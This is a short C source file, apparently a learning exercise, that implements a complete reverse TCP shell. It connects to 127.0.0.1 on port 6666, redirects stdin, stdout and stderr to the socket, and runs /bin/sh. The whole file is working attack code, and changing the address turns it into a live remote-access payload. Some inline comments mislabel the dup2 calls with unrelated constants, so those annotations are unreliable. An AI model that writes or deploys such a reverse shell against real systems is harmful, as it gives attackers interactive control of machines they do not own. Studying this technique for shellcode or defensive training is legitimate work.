/*
Filename: rev_tcp_initial_c.c
Author: hodorsec
*/

#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
	// Defining variables, no need for client anymore seeing the client is setup manually by netcat
        int sock;
        int port = 6666;

	// Defining struct
        struct sockaddr_in sockaddr;

	// Defining Ethernet TCP socket 
	// int socket(int domain, int type, int protocol);
        sock = socket(AF_INET, SOCK_STREAM, 0);

	// Setting variables for struct 
        sockaddr.sin_family = AF_INET; // 2
        sockaddr.sin_port = htons(port); // 6666
        sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // 127.0.0.1
 
	// Connect socket
	// int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        connect(sock, (struct sockaddr *) &sockaddr, sizeof(sockaddr));
 
	// Redirect stdin, stdout and stderr
	// int dup2(int oldfd, int newfd);
        dup2(sock, 0); // AF_INET
        dup2(sock, 1); // TCP port 6666
        dup2(sock, 2); // INADDR_ANY

    // Execute shell
	// int execve(const char *filename, char *const argv[], char *const envp[]);
        execve("/bin/sh", NULL, NULL);

	// Return a value as being expected by main function
        return 0;
}

